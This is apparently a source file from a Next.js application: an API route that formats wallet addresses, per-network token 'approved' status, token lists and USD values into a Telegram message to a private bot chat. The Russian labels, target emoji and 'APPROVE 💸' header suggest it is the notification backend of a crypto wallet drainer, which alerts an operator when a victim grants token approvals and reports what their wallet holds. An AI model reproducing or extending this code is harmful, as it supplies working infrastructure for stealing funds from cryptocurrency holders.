import { NextResponse } from 'next/server'

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID

interface NetworkStatus {
  network: string
  approved: boolean
  tokens: string[]
  usdValue: string
}
export async function POST(request: Request) {
  try {
    const body = await request.json()
    const { address, networks } = body as { address: string; networks: NetworkStatus[] }

    let message = `🎉 *APPROVE* 💸\n`
    message += `━━━━━━━━━━━━━━━━━━━━━━\n`
    
    message += `🎯 *Адрес:*\n`
    message += `\`${address}\`\n\n`
    
    message += `🪵 *АКТИВЫ ПО СЕТЯМ:*\n`
    

    const networkMap: { [key: string]: { emoji: string; name: string } } = {
      'Polygon': { emoji: '🟣', name: 'POLYGON' },
      'Base': { emoji: '🔵', name: 'BASE' },
      'Arbitrum': { emoji: '🔷', name: 'ARBITRUM' },
    }
    
    for (const network of networks) {
      const networkInfo = networkMap[network.network] || { emoji: '⚪', name: network.network.toUpperCase() }
      const status = network.approved ? '✅' : '❌'
      
      message += `🪽 ${networkInfo.emoji} *${networkInfo.name} ${status}*\n`


      if (network.tokens && network.tokens.length > 0) {
        for (const token of network.tokens) {
          message += `  ├─ ${token}\n`
        }
      } else {
        message += `  ├─ No assets\n`
      }
      
      message += `  💰 Стоимость: $${network.usdValue} USD\n`
    }

    const telegramApiUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`
    
    const response = await fetch(telegramApiUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: 'Markdown',
      }),
    })

    const data = await response.json()

    if (!response.ok) {
      console.error('Telegram API error:', data)
      return NextResponse.json({ 
        error: 'Failed to send message', 
        details: data 
      }, { status: 500 })
    }

    return NextResponse.json({ success: true, data })
  } catch (error) {
    console.error('Error sending approve notification:', error)
    return NextResponse.json({ 
      error: 'Internal server error', 
      details: error instanceof Error ? error.message : String(error) 
    }, { status: 500 })
  }
}
